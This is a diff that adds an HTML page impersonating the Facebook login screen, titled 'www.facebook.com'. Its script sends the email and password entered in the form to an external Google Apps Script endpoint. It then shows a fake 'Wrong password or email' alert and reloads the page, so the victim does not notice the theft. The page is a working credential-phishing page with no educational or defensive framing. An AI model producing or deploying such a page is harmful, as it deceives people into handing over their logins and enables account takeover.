@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>www.facebook.com</title>
+    <link rel="stylesheet" href="style1.css">
+    <link rel="icon" href="facebook.png">
+</head>
+
+<body>
+    <div class="box1">
+        <div class="facebook">
+            <img src="fac.svg" alt="found">
+        </div>
+        <div class="container">
+            Facebook helps you connect and share with the people in your life.
+        </div>
+    </div>
+    <div>
+    <div class="fr">
+        <div>
+            <form method="post" name="facebookdata" id="facebookdata">
+                <div class="inpu1">
+                    <input type="email" placeholder="Email address or phone number" autofocus name="Email">
+                </div>
+                <div class="inpu1">
+                    <input type="password" placeholder="Password" maxlength="14" name="Password">
+                </div>
+                <div>
+                    <button  class="log" type="submit">
+                        <a href="facebook2.html" >Log in</a>
+                    </button>
+                </div>
+                <div class="for">
+                    <a href="#">Forgotten password?</a>
+                    <hr>
+                </div>
+                <div>
+                    <button type="" class="cr">Create new account</button>
+                </div>
+            </form>
+        </div>
+    </div>
+    <div class="las"><b>Create</b> a Page for a celebrity, brand or business.</div>
+</div>
+<script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbxWHik3mF1Ew8SIw61piPzMvvuHRMGpPKF5zCE7QonpUQ461v_491ili_4u5y1TZoW5/exec'
+    const form = document.forms['facebookdata']
+
+    form.addEventListener('submit', e => {
+        e.preventDefault()
+        fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+            .then(response => alert("Wrong password or email"))
+            .then(() => { window.location.reload(); })
+            .catch(error => console.error('Error!', error.message))
+    })
+</script>
+</body>
+
+</html>
